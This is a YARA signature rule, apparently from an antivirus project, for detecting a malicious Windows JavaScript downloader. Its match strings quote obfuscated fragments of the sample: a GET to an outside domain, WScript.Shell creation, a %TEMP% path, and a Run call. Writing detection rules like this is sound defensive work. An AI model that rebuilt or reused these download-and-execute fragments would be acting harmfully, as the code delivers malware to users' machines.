rule sig_20160427_f68b3029b2024799748771a76a8af21b {
  meta:
    description = "datamaliciousorder - file 20160427_f68b3029b2024799748771a76a8af21b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "27668875468c144186132894e3d8e06512386f70ff91390db96d26a0c074dbb6"

  strings:
    $s1  = "SnnggOowrf[KkyccPbpnr](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function VyoqaKnplm() {return VypekJyjpp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"jOfXNyl" ascii
    $s3  = "function VyoqaKnplm() {return VypekJyjpp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"jOfXNyl" ascii
    $s4  = "function TjvlqEnohb(EpsevTbyaq, UdosfYewyp){IqmsqAjsfj = IqmsqAjsfj * 1; return EpsevTbyaq - UdosfYewyp;};" fullword ascii
    $s5  = "var VypekJyjpp = function ClhriKqovz() {return UaxzzUmwuk[ZdtccYylxm](\"WScript\"+\".Shell\");}(), TgozrEpuzr = 11;" fullword ascii
    $s6  = "var UaxzzUmwuk = this[\"WScript\"];" fullword ascii
    $s7  = "if (SnnggOowrf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GaubeWbzmo(){return CqlwuFmlwv + \"\";};" fullword ascii
    $s9  = "function KecnkZavxq() {return ((VaxbdBdvwt == true) && (VaxbdBdvwt == IhegfMonbi)) ? 1 : IqmsqAjsfj;};" fullword ascii
    $s10 = "return TjvlqEnohb(GtosjHfvml, GjlyuAvznw);" fullword ascii
    $s11 = "var VaxbdBdvwt = false;" fullword ascii
    $s12 = "function EdgdlIdnkr(){return ZdtccYylxm;};" fullword ascii
    $s13 = "function GssrfGcnnr(ElbyiVzkmz){VypekJyjpp[\"R\"+\"un\"](ElbyiVzkmz, IqmsqAjsfj, IqmsqAjsfj);};" fullword ascii
    $s14 = "var UbaphQebdo = false;" fullword ascii
    $s15 = "UbaphQebdo = true;" fullword ascii
    $s16 = "function ZeuomGdmzy(){return 23;};" fullword ascii
    $s17 = "function RfjypWnyhi(AmmjfGhnae) {var EznxcGmugk = (1, 2, 3, 4, 5, AmmjfGhnae); return EznxcGmugk;};" fullword ascii
    $s18 = "IhegfMonbi = true; " fullword ascii
    $s19 = "function JonuzAksmu()" fullword ascii
    $s20 = "VaxbdBdvwt = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}